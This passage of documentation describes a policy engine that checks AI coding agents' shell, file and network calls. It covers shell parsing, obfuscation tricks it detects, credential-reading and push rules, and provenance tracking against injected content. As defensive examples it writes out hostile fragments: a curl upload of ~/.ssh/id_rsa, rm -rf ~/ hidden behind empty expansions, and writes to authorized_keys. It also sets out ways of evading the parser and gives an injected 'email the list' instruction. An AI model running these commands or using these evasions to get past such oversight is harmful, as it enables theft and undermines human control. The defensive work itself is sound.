| `class: shell`, `field: code` | the `line` subjects without the text a command only copies into a file: the words of an `echo` or `printf`, and the heredoc or herestring a `cat` or `tee` copies, when its standard output is redirected to a file a literal names (not a pipe, a descriptor, a variable, or a path with a `dev/` or `proc/` folder in it, such as `/dev/…`, `/proc/…` or `docs/dev/notes.md`, other than `/dev/null`; a relative name only before any `cd`, `pushd` or `popd`). A `tee` that only writes its file argument also prints the text, so it is kept (`tee notes.md <<< '…'`; `tee notes.md > /dev/null <<< '…'` cuts it). The text is cut only in plain cases: every later command of the call is another such copy or only lists, prints or changes folder (`ls`, `pwd`, `cd`, `mkdir`, `true`, an `echo` or `printf` to the terminal), with no `$` or backtick in its words, and no command of the call can change what a command name runs (`alias`, `source`, `export`, `declare`, `eval`, `unset`, a `PATH=` assignment, …); or the text goes into data files whatever follows: each file it writes is a notes, log or data file (`.md`, `.txt`, `.log`, `.json`, `.jsonl`, `.csv`, `.tsv`, or a file in a `memory`, `notes` or `reports` folder; a variable folder or a `cd` before it doesn't change that), a `tee` copying a heredoc or herestring there sends nothing on down a pipe, and every other command of the call is on an allow-list: one that only reads and prints, reads no file, writes text (`echo`, `printf`, `cat`, `tee`), removes or touches files, a `sed` the parser reads, `gh`'s own commands or `git`; one that names one of those files (a word the line builds or a pattern counts as naming it) only reads and prints it to the terminal or down a pipe of readers and text filters, writes text into it, posts it (`gh`) or commits it (`git add`, `commit`); a copy, move or link, its text appended or redirected anywhere, a shell, an interpreter, a project script or `make` on the line keeps the text. A word with an expansion is kept, and so is a heredoc whose command substitutions run (an unquoted delimiter); in a nested script (`bash -c '…'`) the raw command keeps the text |
| `class: fs`, `field: path` | the normalised path, and with a `..` also the lexically normalised one; each also as Windows opens it (each part without trailing dots and spaces or an NTFS stream: `C:\p\.env.`, `.env ` and `.env::$DATA` are `C:/p/.env`) and casefolded |
| `class: sql`, `field: code` | each dialect's reading of the statement (`code` above) |
| `class: shell`, `field: effects` | each `WRITE_TARGET:path` and `DELETE_TARGET:path` (above), and on a line with a writer whose files come at run time each `MAY_WRITE:word`, also casefolded |
| `field: target` (any class, or no class) | shell: each command's argv without its data words (a `git commit`/`tag`/`merge` message, the pattern `grep`, `rg` or `git grep` searches for), its redirection targets and `VAR=` assignments, and a program an interpreter reads from a heredoc or herestring (a command it can't parse: the raw command), each also casefolded (the write and delete tags are `effects`, not targets); fs: the paths; http and browser: the URL; email: the attachments; mcp tools: the whole arguments without the text the tool only carries (the string value of a `title`, `body`, `text`, `description`, `comment`, `message`, `subject` or `content` argument at any depth, for a tool whose name says it posts, comments, replies, creates an issue, comment, pull request, discussion, review, ticket or note, or sends a message and doesn't say it types, sends keys, runs, executes, evaluates or holds code or a cell; and the `query` or `q` of a tool whose name says it searches and doesn't say it fetches, reads or opens), and each string in them with a `/` or `\` also as a `path` is read (normalised, `..` resolved, casefolded); app and unknown tools: the whole arguments. Each URL in a target is also matched as `scheme://canonical-host/` |
| another class field | the extracted field |
| a `field` that is no class field | the raw argument of that name |
| no `field` (not shell) | the whole arguments as compact sorted JSON (so Write content, WebFetch URLs and MCP arguments are scanned) |

A rule fires when its pattern matches any of its subjects and `unless` does not match that subject. Use `unless` only
where the subject is one target (a file path): in a whole command line it could exempt a different target. On a
subject that joins a command's words (shell `argv`, `target`, `push`, `tracekit`'s `ACT:`), `unless` must match it
again with each word's own blanks as `\x7f`, so what it names counts only as words of the command's own: in
`gh auth token 'x --help'` the quoted `x --help` is one word, and no `--help`. `target` is a class field in every
class, so a rule can't name a raw argument called `target`.

**Shell parsing** (`policy2/shell.py`, its own tokenizer): quotes, escapes (`$'…'` as bash 5 decodes it, cut at its
first NUL as bash's C string is: `r$'\x00zz'm` is `rm`), `;` `|` `|&` `&&` `||` `&`, newlines,
`$()`, backticks, `<()`, heredocs, `VAR=` prefixes and wrappers (`sudo`, `env`, `nohup`, `timeout`, `xargs`, `nice`,
`exec`, `command`, `taskset`, `chrt`, `unbuffer`, `fakeroot`, `dbus-run-session`, `caffeinate`, `npx`, `uvx`, `dotenv` (and python-dotenv's `dotenv run`), `catchsegv`, `heaptrack`, `faketime`, `xvfb-run`,
`torsocks`, `firejail`, `gosu`, `tini`, `cmd /c` or `/k` (`//c` under MSYS), `wsl` bare or with `-e`, `--exec` or `--`, …) and runners (`uv run`, `uv tool run`, `poetry run`, `pipenv run`, `pdm run`,
`pipx run`, `hatch run`, `conda run`, `direnv exec DIR`, `mise exec … --`, `op run`, `doppler run`, `npm exec`,
`pnpm dlx`, `yarn dlx`, `bun x`, `rustup run TOOLCHAIN`, `tracekit srt-decider`, `honcho run`, `foreman run`,
`chamber exec … --`, `aws-vault exec PROFILE`, `infisical run … --`, `asdf`, `pyenv`, `rbenv` or `nodenv exec`, `volta run`,
`fnm exec`, `devbox run`, `perf stat`, `record` or `trace`, `rr record`, `cross-env`, `env-cmd`, `envchain NAMESPACE`,
`dotenvx run`, `teller run`, `tox exec … --`, `nvm exec VERSION`; gdb's `--args` and `-ex run`, lldb's `--`, `bwrap`,
`ip netns exec`, and the line nodemon's `--exec` or `doppler run` and `infisical run`'s `--command` runs; a runner's subcommand after its own options too: `pnpm -r
exec`, `npm -w a exec --`, `yarn workspaces foreach -A exec`, `yarn workspace foo exec`, one spelled as an option's
value read both ways, `uv --directory run run …`, and a runner npx or corepack names at a version, `pnpm@9`; bun's
code (`bun -e`) and bunx's run (`bun x -p pkg cmd`) both; kubectl as microk8s, k3s and k0s run it, microk8s.kubectl,
kubecolor and `minikube kubectl --`, and `ntl` as netlify) are
resolved, uv's command is also read with its options before it, and between `tool` or `pip` and theirs, left out
(`uv --directory /tmp tool --quiet run …` as `uv tool run …`), and what uv's or uvx's `--directory` or `--project`
runs is read in that folder too, as `env -C`'s is; `python -m` with `uv`, `pipx`, `hatch`, `pdm`, `poetry` or `pipenv`
is read as that tool, a shell's option cluster with an `o` or `O` takes the next word (`bash -euo pipefail -c '…'` runs its
script), as do zsh's `--emulate` and mksh's `-T`, a program
name is read casefolded and without `.exe`, `.cmd`, `.bat` or `.ps1` (npm's Windows shims: `npm.cmd` is npm; but `echo.bat`, `grep.cmd` or `sh.ps1`, a script named for a bash builtin, a shell or a program that reads data, is a script of its own; one named by a path with a `\` also as Windows runs it: `'C:\Git\bin\bash'`
is bash), and the parser follows what a shell or interpreter runs: `bash -c`,
`nix-shell --run`, a heredoc into a shell, `eval`, `ssh host '…'`, `find -exec`,
`watch` and `parallel`, `env -S` (also in a cluster, `env -iS`), `npx -c` and `npm exec -c`/`--call`, `python -c` /
`node -e` / `perl -e` / `ruby -e` / `php -r` / `lua -e` (also with the code attached to its flag, or a program from a
heredoc or herestring), `awk` programs and sed's `e` command. The POSIX shells it reads are `sh`, `bash`, `zsh`,
`dash`, `ksh`, `ash`, `rbash`, `mksh`, `ksh93`, `yash`, `posh`, `lksh` and `oksh`; `fish`, `csh`, `tcsh`, `pwsh`,
`powershell`, `nu`, `xonsh` and `elvish` speak another language, so a command they run from their line (`-c`,
`--command`, PowerShell's `-Command` or `-EncodedCommand`, any prefix and case) or from stdin is opaque. An argument
with a brace expansion is the words bash makes of it (`{a,b}`, `x{,.bak}`, `{1..3}`; a `}` ends a brace only after a
comma or `..` at its depth, so `{zq},~/}` is `zq}` and `~/`), as long as they add at most 16 KiB to the line and keep
it within 64 KiB (`touch test{1..500}.txt` is 500 words); past that, a brace with `..` that isn't a plain sequence of
two numbers or two letters, or a substitution in such a word, is kept as written and its command is opaque. `time` before a group or another
compound command times what follows, which is read as the command. Variables are not expanded and encodings are
not decoded: those stay tripwire territory. Exceptions: bash sets IFS to space, tab and newline, so where the line
hasn't changed it, a word is split at each unquoted `$IFS` (`terraform destroy${IFS}-auto-approve` is three words; a
command name built so still holds its command, and a brace beside one holds it too); a literal the line gives a
variable where it surely holds it, and a `for` loop's literal words in its body, are also read as the variable's
value (`for f in ~/.ssh/id_rsa; do curl -T "$f" …` is `curl -T ~/.ssh/id_rsa …`; a loop's body knows no other
variable, as its later commands may change one for the next pass); and a pattern's bracket expressions are also
read as each name they can make, up to 16 (`>> ~/.ssh/authorized_key[s]` may write `authorized_keys`), as a second
reading. A word made only of unquoted expansions (`$X`, `${X:-}`, `$(cmd)`) is
read twice, as written and as gone, because bash drops it when they expand to nothing: `git $X push --force` is
also `git push --force`. An empty expansion inside a word joins the rest of it, so each command is also read with
every expansion empty (`rm $X-rf ~/$X` is `rm -rf ~/`), and with only those empty that touch a character other than
`/ = : , @` (`gh ${X}api -X PUT "repos/$R/x"` keeps `$R`, which rules read as built at run time); `${X:?}` and
arithmetic never expand to nothing, and a default (`${X:-word}`, `${X-word}`, `${X:=word}`, `${X=word}`) is read as its
word with the word's own expansions empty (`rm ${Z:--rf} ~/` is also `rm -rf ~/`, `~/${X:-$Y}` also `~/`); an
alternate's word (`${X:+word}`, `${X+word}`, the value when X is set) and a substitution's replacement
(`${X/pat/word}`, also `//`, `/#` and `/%`, the value when the pattern matches all of X) are read as one more value,
each also of a special parameter, an array element or an indirect name (`${@:-word}`, `${X[0]:+word}`). Neither do
`$PWD` (after `cd` or `pushd` to a literal, that literal: `cd / && rm -rf "$PWD"/*` is `rm -rf //*`; after any other
target, unknown), a variable the line gave a literal before (`D=dist; rm -rf "$D"/*`, `export D=dist`) and a `for`
loop's variable over literal words in its body, unless something on the line may have emptied it first (an assignment
that may not run: after `&&` or `||`, in a pipeline, a subshell, an `if` or a loop, or in a `{ }` group once it ends;
`X+=y` of an X the line doesn't know; `read`, `declare`, `printf -v` (also `-vNAME`), `compgen`, `eval`, `trap`, an
unreadable command name; in a loop, a later command of its body). `X=`, `unset X`, a loop over `""`, `${X:+}`,
`${X:0:0}` and `${X%%*}` are empty for certain, so a deny they make stays one. A deny that
only such an empty reading makes (`rm -rf "$VENV"/`) takes `on_parse_error`'s section with the rule's id: it asks by
default, as the line can't say whether `$VENV` is empty. A backslash-newline is gone before the words are read, as in bash; one between `$` and `(` or `{`, or between the characters of an operator (`(\⏎(` is `((`, `<<\⏎-EOF` is `<<-EOF`), makes the line unreadable,
as does bash 5.3's `${ cmd; }`. A command it cannot parse is still decided on the line before the word it
stopped in, parsed, and on its text split at `;`, `&`, `|` and newlines into blank-separated words, so a deny before
an unreadable word or on plain words stands. A command it cannot parse, or one that
is opaque, asks (`TK-SHELL-PARSE`): a glob or an expansion in a command name (`$x id`; a `$VAR/` directory in front of a
literal name is fine), a shell or interpreter reading its program from a pipe or file, `xargs -I` putting its input
into a script or command name, sed's `s///e`. A command name a variable gives is read with the literal the line
surely gives it (`PY=.venv/bin/python; $PY -m pytest`, a for loop's words), and isn't opaque when it is a path; a
bare program name a variable gives (`X=rm; $X …`) only hides that name, so it is read and still held. A value from a
substitution, the environment or an assignment that may not run (`cd x && PY=…; $PY`) stays opaque, and so does every
variable on a line that names `IFS` (where bash splits a value can't be told). A shell function
(`f() { …; }`, `function f { …; }`) is read where it is called, its body with the call's words as `$1` … and `"$@"`
(a call in its own body is opaque; a function named `cd`, `export`, `unset` or `command_not_found_handle` makes the
line unreadable); a body the line doesn't call after defining it (one given after its name's last call too), or
one it exports (`export -f`), is read as if it ran and held, as a shell that
persists or a bash child may run it later; on a line that may download (its text names `curl` or `wget`, a command
is one, or a command's name isn't written plainly: `c''url`, `$X''rl`), a function makes the line unreadable, as
before (`TK-D002` reads that line's text); every arm of a `case` is read; `bash --version` and `--help` run no
script. The decision's `unread`
says why a command is held (`function`, `download`, `name`, `pattern`, `input`, `foreign`, `quote`, `readings`, `syntax`), and the signer gives that cause's own
reason and remedy.

**Paths:** a `\` is a `/` and `C:/…` is absolute (the agent may run on Windows). An absolute path without `..` is
normalised. A relative path, or one with a `..` a symlink could redirect, is unverifiable, so the rule matches its
certain suffix (after the last `..`) and, with `..`, also the lexical normalisation. Every form is also matched
casefolded, because the agent's file system may ignore case (macOS, Windows) whatever the signer's does: write path
rules in lower case, or with both cases of a letter (`[Ll]ibrary`).

### Hostile twins

An `unless` reads text, and text can be made to look like the exemption. A shell rule's `unless` also reads each
subject with the spaces inside a quoted word kept apart from those between words, and exempts a call only when it
holds there too: `terraform destroy 'x --help'` is no help request (a call of more than 64 quoted words gets no
exemption: [limits](limits.md#run-conditions-18)). An fs `path` is every path argument a call has
(`file_path`, `notebook_path`, `path`), so a decoy under one of them can't stand for the file the tool opens. For every
shipped rule with an `unless`, `tests/test_hostile_twins.py` decides twins of a call the rule matches on every
shipped pack and both engines, and none may be decided looser than that call: on a command line, the exempt text as a
quoted last word, as another option's value, after `--` and after a tab in its own word (words are joined by single
spaces: an `unless` that takes `\s` between words takes a word holding a tab for two), each option of the program that undoes the
exemption after it (curl's `--next`, `-:`, `-K`, `--config` after a `-G` request), and the call through an MCP tool
with the exempt text in a decoy argument; on one value or a call's whole arguments, the exempt text in a decoy argument, in another argument
for the same field, in a key that ends as the exempted one does, and in a decoy MCP argument. A rule you add with an
`unless` gets an entry there (the test fails without one).

## CLI grammars

A rule's text `unless` reads a command as its words joined by spaces, so a flag inside a quoted word (`"x --help"`) or
another flag's value (`--notes 'see -d'`) reads like the flag itself. Ten CLIs have a grammar that reads an argv as
the CLI does: git, gh, aws, gcloud, kubectl, docker, npm, pip, terraform and curl. Each table in
`tracekit/policy2/grammars/` is generated by `scripts/gen_cli_grammars.py` from the CLI's own definition at a pinned
release (cobra's command tree for gh, docker and kubectl; the botocore models and the CLI's renames for aws; gcloud's
static completion tree; git's option tables; curl's option table; npm's config definitions; pip's optparse options;
terraform's command map and Go flags) and records that release and its commit. It holds each command's subcommands,
which flags take a value, and how many positionals it takes. The aws and gcloud tables keep only the commands a
shipped pack reads by grammar (the generator's `ONLY`: aws `secretsmanager get-secret-value` and
`batch-get-secret-value`; gcloud `secrets versions access`, `run deploy`, `run services update` and `app deploy` on
each track), with the groups above them; whole, they are 4.3 and 3.9 MB. Any other command of theirs is read as text.
A table that is missing or can't be read is a lint warning, and its commands read as text.

gcloud's source has no official repository: its table comes from the static completion tree
(`data/cli/gcloud_completions.py`) of the SDK release as `google-cloud-sdk-unofficial/google-cloud-sdk` mirrors it,
at the commit the table records. That mirror is unofficial. A wrong table can only narrow: an exemption needs the
grammar and the text `unless` both, so a table that misreads a command takes an exemption away or reads it as text,
and never adds one.

A shell rule (field argv, or none, or push) may list `unless_cli` entries:

```yaml
unless_cli:
  - {command: gh release create, flag: --draft}
  - {command: 'aws secretsmanager (batch-)?get-secret-value', flag: --help, alone: true}
  - {command: curl, flag: --get, without: [--request, --next, --config]}
```

| Key | Meaning |
|---|---|
| `command` | a pattern matched against the whole `program subcommand ...`; its first word is the program |
| `flag` | a switch that must be on: its last value is true (`--draft`, `-d`, `--draft=true`; `--draft --draft=false` is off). `--no-X` is on when X's last value is false |
| `without` | flags that must not be given, in any spelling |
| `alone` | `true`: no other flag and no positional |
| `required` | `true`: only a command the grammar reads can be exempt; one of this program it can't read is judged without the text `unless` (TK-A043's curl) |

When the rule's pattern matches a call, each command of a program its entries name is read by that program's grammar.
A grammar only takes an exemption away: a command the grammar reads is exempt only when an entry takes it and the text
`unless` does too, so a flag inside a quoted word or another flag's value exempts nothing. A command the grammar can't
read is read as text, with the text `unless`, as before (unless an entry is `required`): an unknown subcommand or flag
(a newer release's, a plugin's such as `docker compose`, an alias), an abbreviation the CLI would take, a value given
apart from its flag that starts with `-`, too many positionals, a word with a `$`, a backquote or a glob, or a command
xargs, parallel, find or fd runs (they may add words). Two such words are read: a double-quoted expansion (bash keeps
it one word, whatever its value; not `"$@"` or `"${a[@]}"`, which are a word each) where the grammar takes it as a
flag's value given apart (`curl -u "$KEY:"`, `--notes "$N"`) or as a positional after `--`, and a folder's pattern of
paths (`dist/*`, `./build/*.tgz`: every name it matches starts with the folder) where it takes it as a positional or a
value. Anywhere else a quoted expansion may be a flag (`gh release create "$TAG" -d` with `TAG=--notes` takes `-d` as
the notes, and the release is published), and so may a pattern such as `*` or `v*`. `tracekit policy lint` checks
each entry.

The shipped packs read these by grammar: TK-A001 (terraform help), TK-A035 (aws and gcloud help), TK-A043 (curl's
`--get`, after `-q` first, which makes curl read no config file; only on a curl the grammar reads, `required`: a glob,
an expansion or xargs leaves it held), TK-A048 (docker help), TK-F030 (a draft gh release, `required`)
and, in the dev pack, TK-A056 (a draft gh release, a Cloud Run deploy or service update with `--no-traffic`, an App
Engine deploy with `--no-promote`, each `required`: `set -- --draft=false; gh release create v1 -d "$@"` is held).
TK-A095 reads curl's requests by its grammar (the shell field `requests`).

A gh command an alias names is also read as the command it is, from the leading words alone, as cobra finds it:
`gh release new v1 ./dist/*` is `gh release create`, whatever the rest of the argv holds. The push field
(`engine._pushes`) reads the publishes and pushes that run to any length per command, each as `PUSH:<why>`: a release
created or a draft published through GitHub's API (`gh api`, curl, HTTPie, wget, xh), `gh release edit` whose last
`--draft` gh's grammar reads as false (where it can't read the command, any `--draft=` value that isn't a literal
true: `--draft="$D"`), `hub release edit` with such a value, or `goreleaser release` (`r`, and its root command)
without `--snapshot` or a `--skip` of publish; an image pushed by docker, podman, nerdctl, finch or buildah (a build or
`buildx build` with `--push` on or a registry output, `buildx bake` unless `--load`, `--print` or a last
`--push=false` keeps it local (its bake file may push), `compose push`, `compose build --push` (docker-compose's and
podman-compose's too), `buildx imagetools create`, `push`, `manifest push`, podman's `artifact push` and `farm
build`, buildah's `commit` to `docker://`), and crane's, oras's, regctl's, ctr's, ko's and skopeo's writes to a
registry (crane's and oras's commands but those that only read; regctl's `copy`, `put`, `mod`, `delete`, `import`,
`create`, `add` and `rm`; ctr's `images push`; ko's `build`, `publish`, `resolve`, `apply`, `create` and `run` without
`--local` or a false `--push=`; skopeo's copy to `docker://`, sync to
docker, delete); a tag
made, moved or deleted through GitHub's refs API (`PUSH:tag`: a `git/refs` create whose `ref` names `refs/tags/…` or
one the line can't tell, a write to `git/refs/tags/…`); `git subtree push`, read as the push it makes; a push setting
that maps a push with a refspec (`git config remote.<name>.push`, a push URL, mirror or URL rewrite, `insteadOf`
too, which rewrites a push URL where no `pushInsteadOf` is set, to another host, port or path prefix (compared
exactly: `…/org` for `…/org/` joins the next word to it), to a transport that isn't https or ssh (`http://`, `git://`,
`file://`, whose host git drops), or one the line can't tell (a rewrite that changes only the scheme between https
and ssh or the user, `git@github.com:` or a token for `https://github.com/`, is none; a URL's authority ends at its
first `/`, and one with a `?`, `#`, `\` or `%` before its `@` is no shape read),
an included file, a key the line can't tell, `git remote set-url --push`, the same given with `-c`, or with `git
clone`'s `-c` or `--config` into the new repository), a Git alias whose value may push (set by `git config`, `-c`,
`--config-env` or git's config environment, `GIT_CONFIG_KEY_<n>` and `GIT_CONFIG_VALUE_<n>`, on any command): any
value but one of git's commands that can't push, after git's own switches (`-p log`; `log`, `status`, `commit`,
`checkout` and the others of `engine._ALIAS_SAFE`), and one of those given an option that runs a command (rebase's
`-x`, grep's `-O`, fetch's `--upload-pack`, a merge or pull strategy but git's own) or a word the line can't tell
(a saved alias is also read as the command it runs, so the file its `--output` writes is a write the `effects` field
reads), so another alias (`pu`), a `!` shell
command and an unknown word are held; a link made to a Git or cargo config file or folder (`ln`, `cp -s` or `-l` of
`.git`, `~/.gitconfig`, `.cargo`, `.config/git`), whose own name a file tool can then write it by; a template directory for a new repository (`git clone` or `git
init` with `--template`, `-c init.templateDir`, `git config init.templateDir`, `GIT_TEMPLATE_DIR` set on its line:
its `config` is copied in), a cargo alias that publishes (`cargo --config alias.b=publish b`, or one the line can't
tell; any `CARGO_ALIAS_<NAME>`, or `CARGO_HOME`, set on a cargo command's line; a cargo config file a command
writes, `.cargo/config.toml` or `.cargo/config`, an installation's `cargo/config.toml`, `$CARGO_HOME/config.toml`, or
the one under a `CARGO_HOME` the line sets), `git config --edit` (`-e`, `git config edit`: an editor writes any key, `GIT_EDITOR='tee -a'` too), which changes
where a later `git push origin feature` goes, a Git config file a command writes (`>> .git/config`, a bare
repository's `x.git/config`, a worktree's `config.worktree`, `~/.gitconfig`, any `git/config`, the system's
`etc/gitconfig`: as the `effects` field reads a write, git's own `--output` among them), a virtualenv's activate script
a command writes (`bin/activate`, `activate.fish`, `activate.csh`, `Scripts/Activate.ps1`), a push given another
repository's config (`--git-dir`), and a line that moves the config files its git push reads (`GIT_CONFIG_GLOBAL`,
`GIT_CONFIG_SYSTEM`, `HOME`, `XDG_CONFIG_HOME`, `GIT_DIR`, `GIT_COMMON_DIR`) or sources a file that may (`source`,
`.`, `BASH_ENV`; but the activate script of a virtualenv in the project, by a relative path written out,
`.venv/bin/activate`, `venv/`, `env/`, also in a subfolder, as writing one is held); and a command of a CLI that publishes whose
subcommand the line can't tell (`git $X origin main`, `git "$@"`, a command xargs gives its subcommand, a word xargs'
or parallel's `-I` string fills in, or under parallel, `find -exec` or `fd -x` a `{…}`: `echo push | xargs -I{} git
{} origin main`), or a word anywhere along a group's command path, before its command's own words (`gh release $X`,
`docker image $X`, `docker compose $X`, `docker buildx imagetools $X`, `git subtree $X`, `yarn npm $X`, `yarn
workspace w $X`, `yarn workspaces foreach -A npm $X`, `terragrunt run-all $X`, `terragrunt stack run $X`, any word
after an `aws` or `gcloud` group, `gcloud run services $X`, `gcloud beta app $X`, `gcloud app versions $X`: the
groups a CLI's table names, and `engine._GROUPS` and `_SUBGROUPS`). gcloud reads a global flag anywhere along its
command path, so `gcloud run --project p deploy svc` is also read as `gcloud run deploy --project p svc` (a
flag's value in the next word too, in a group its table doesn't name: `gcloud app services --project p set-traffic`). A runner that
appends words to the command it runs (`xargs` without `-I`, `parallel` without a `{…}`, `:::` and `-X` too, `fd -x`)
adds one the line can't tell, so `parallel git push origin feature ::: main` is a push whose branch the line can't
tell. An option takes the word after it as its value where the CLI's table says it takes one, or, for a
CLI with no table, where the CLI's own list of options that take a value names it (`engine._VALUED_OPTIONS`: `yarn
--cwd "$DIR" build` names `build`); any other option is a switch, so an expansion after it may be the subcommand and
is held (`npm -s "$X"`, `helm --debug $X`). npm's table holds its shorthands (`-s`, `--silent`, `-d`, `-q`: each a
switch, `--loglevel` with its value). `push.default`, `remote.pushDefault` and `branch.<name>.pushRemote` pick only a bare push's target, which is
held already. A file tool's write of a Git or cargo config file (`.git/config`, a submodule's or worktree's, a bare
repository's, `config.worktree`, `~/.gitconfig` and a file named for one a config includes, `.gitconfig.local`,
`.gitalias`, any `git/config` (`$XDG_CONFIG_HOME`'s), `etc/gitconfig`, `.cargo/config.toml`, an installation's
`cargo/config.toml`) or of a virtualenv's activate script is `TK-F048`'s, a file rule: flagged in the laptop and
server packs, held in the dev and strict packs; so is, as `TK-F049`'s, a Git config section in git's syntax a file
tool writes (an `[alias]`, `[remote "…"]`, `[url "…"]`, `[include]` or `[includeIf "…"]` at a line's start, in any
case, also after another header's `]`, a UTF-8 BOM or a form feed, and git's old `[remote.<name>]` with a `push`,
`pushurl` or `mirror` key) into a file a Git config may include by any name:
the fs field `git_config`, none for a source, document or data file by its extension (`.md`, `.py`, `.toml`, `.txt`,
…) or another tool's config (`.hgrc`). docker's table names no plugin (buildx, compose): those words are read by their
text, wherever they are, which can only hold more. TK-A056 holds each in the dev pack; TK-F030 flags each in the
laptop and server packs, and the strict pack holds it.

## Fail-closed classes

With no signer answering, a hook follows its run's fail mode for the tool's class (the signer's `fail_modes`, from
`register_run`; system mode always fails closed). Where that mode is open, the coding agents' hooks (Claude Code's and
the other harnesses' v2 hooks) still fail closed for four classes: reading a secret, a deploy or publish, moving money,
and a push to main (or to a branch the line can't tell, of tags or of every branch). The Python and TypeScript SDKs
and the framework integrations follow the fail mode alone: with it open, a call of any class runs. The hook checks a call by class first, in code that reads what the call names: the tool's name, the files,
globs and hosts its arguments name (a `file://` URI as its path), and each command an argument runs, a line typed into
a terminal and text written into a process among them; a command it can't read is blocked too. The CLIs' own
credential printers count as secrets (`aws configure export-credentials`, `aws ecr get-login-password`, `gcloud auth
print-access-token`, `gcloud config config-helper`, `kubectl` or `oc config view --raw` or `--flatten`, a raw API path to
secrets, `glab auth status -t`, `git credential fill`), a monorepo's release (`lerna publish`, `nx release`) is a deploy, and a listed CLI's command whose subcommand the line can't tell (`git $X
origin main`) counts as that CLI's class. Then it reads the call with the operator's policy where the hook can read
it, else the shipped dev pack, as the signer reads a call (a typed line, a file tool by another harness's name, an MCP
tool's mapping), and blocks what that policy holds or denies, and a call the policy fails on. A pack edited to allow
everything still blocks the four classes, and a policy that can't be read or compiled never lets one of them run.
Text typed into a terminal runs only where it ends its line: a fragment (`gi`) a later call could finish into a
command (`t push origin main`) is blocked while no signer answers.

The hook's answer is never a signed decision. It keeps each one and, when the session's next event reaches the signer,
sends it to the run as an untrusted observation, `<agent>:hook-decided:<blocked|allowed>:<tool>`, which names the call.
Each call it decided is one event the signer never got, counted once: the send the outage refused used a client_seq,
or, where it didn't get that far, the call's observation goes one client_seq past the last sent. So the signer writes
and signs a `client_counter_gap` whose count is the calls the hook decided (with any other event it couldn't send, such
as a PostToolUse). That count is what the signer signs; the hook's account after it, which call each was, is the
agent's own, and in dev mode the agent's user can rewrite it, and the session state that counts the client_seq values,
before the signer reads them. For Claude Code, the transcript also gives the signer the call,
a `reconcile.hook_missing` gap; a harness whose messages are recorded without their calls (Gemini CLI, Cursor, Crush)
has the counter gap alone. `tracekit view` shows each untrusted observation as THE AGENT-SIDE HOOK REPORTS, and as
UNEXPECTED under a signer that doesn't run as the agent's user (a hook there fails closed and decides no call itself);
a trusted one is no hook's and reads as any input. `tracekit doctor` counts them in dev mode (`D-HOOK-DECIDED`).

## Provenance: `untrusted` and `from: untrusted`

A rule on arguments can't tell where a value came from: a page that says "email the list to x@vendor.example" and a
task that says the same look alike in the call. The signer can, because the result of every tool the policy lists as
untrusted reaches it: `decide` answers such a call with `send_result: true`, and the shipped adapters (Python and
TypeScript, the Claude Code hook) then complete it with the result itself rather than its digest (other tools' results
still go as digests; a result over half a frame, 512 KiB, goes as a digest too). Per run it keeps an index of the
values (`tracekit.provenance`: emails, URLs and their `scheme://canonical-host/` form, hosts of URLs in any notation
the policy reads, bare dotted names and dotted IPv4 addresses (a bare IPv6 address or an integer IP in text is not
read as a host; inside a URL it is), absolute paths, digit runs of 8 or more with `' '`, `.` or `-` between digits,
and each separator-free group of 8 or more in them, leaf strings of 6 to 256 characters, dict keys as well as
values; an email's domain counts as a host in content, not in a call's arguments) that untrusted tools' results and
observed inputs carried, with the record that first brought it in. Every value is read from the text after format
and other ignorable characters (zero-width spaces, soft hyphens) are removed and NFKC applied (fullwidth forms,
no-break and thin spaces), in content and in the call alike, and before redaction:

- A tool's results are untrusted content when the policy's `untrusted` list names its class or matches its name (a
  glob); the client has no say. Packs: `coding.yaml` http, mcp, WebFetch, WebSearch; `browser.yaml` browser;
  `server-net.yaml` http; `server.yaml` http, browser, mcp (it maps no tool that reads mail, tickets or documents:
  list your own, such as `read_inbox` or `get_ticket`).
- `observe` (Python `run.observe(value, source=..., trust="untrusted")`, TypeScript `run.observe(value, source,
  trust)`) records other content: a mail, a ticket, a page the app fetched itself. Send the task or user prompt with
  `trust="trusted"`. That label is the calling process's claim, and the signer takes it as given: provenance protects
  against injected content, not against a malicious agent program, which can observe anything as trusted (or send
  digests instead of results) and so get past `from` rules. The task must come from the caller, not from the agent;
  an agent that observes an attacker's text as trusted only hides its own input.
- Results of tools not in `untrusted` (SQL, shell, your own tools) are not indexed either way: a tool can echo what
  the agent put in its arguments (`echo`, `select '…'`), so counting its output as trusted would launder an injected
  value. Only an input observed as `trusted` makes a value trusted, whichever came first. A value the deployment's
  own data supplies (a customer's address from your CRM that also appears in their ticket) reads as untrusted-only
  until the app observes it as trusted, so a reply to it is held: observe the record you looked up, or answer the
  hold.

A rule with `from: untrusted` matches only when its pattern matches as usual **and** a value in that subject is
untrusted-only in the run. A list field (`payees`, `recipients`) is checked element by element; `sends_to` is looked
up as the host it is, without a trailing dot (`evil.example.` is `evil.example`). A decision records `provenance` (up to 16 arguments whose values are untrusted-only, as
`{field, kind, source: {run_seq, tool, tool_call_id}}` — never the value) when there is something to show, and
`provenance_state` with `provenance_reason` when the index is not `complete`
([format](format-v2.md#3-events)):

| State | When |
|---|---|
| `partial` | an untrusted tool's call completed with a digest, a `{hash, size}` reference or no result (an adapter that ignores `send_result`), an untrusted input was observed as one (content over half a frame: one MCP tool, resource or input request over 512 KiB), or a client's events skipped a `client_seq` (`client_counter_gap`: an observe or a result the signer never got), from the decision that reveals the gap on; from its start for a run registered with `continues` (a later run of an agent session, whose model may still hold what an earlier run read: [limits](limits.md#provenance-11)) |
| `truncated` | a result or untrusted observed input carried more values than are read (4096 values, 1 MiB of text), or the run's index reached 20000 values |
| `unavailable` | the signer restarted without a content vault to rebuild the index from (it lives in memory only); with one, the index is rebuilt from the run's records and the vault, and is `partial` where an untrusted record's content can't be read back whole (a storage outage the signer recovers from keeps the index: `partial` once a write the store reported failed turns out to have reached it) |
| `timeout` | reading this call's values took past the decision's deadline (1 s) |

**Fail closed:** in every state but `complete` a `from: untrusted` rule matches whenever its pattern does, in its own
section (the packs' `TK-P` rules ask), since the index can no longer say a value is not untrusted. The first cause
stays for the rest of the run (`timeout` only for that decision). The work is bounded: reading values is linear in
the text (1 MiB in well under a second), and a decision reads them only while its index has entries.

| Pack | Section | Rules |
|---|---|---|
| `server-comms.yaml` | ask | `TK-P001` an email recipient (`to`, `cc`, `bcc`, `recipients`) that is untrusted-only · `TK-P002` a payee or account (`payee`, `to`, `recipient`, `destination`, `account`, `account_number`, `iban`) that is untrusted-only |
| `server-net.yaml`, `browser.yaml` | ask | `TK-P003` data sent (a method other than GET or HEAD, a body or a query, but not a GET of a link exactly as untrusted content gave it; in a browser, typing, an upload or a navigation with a query string) to a host that is untrusted-only |

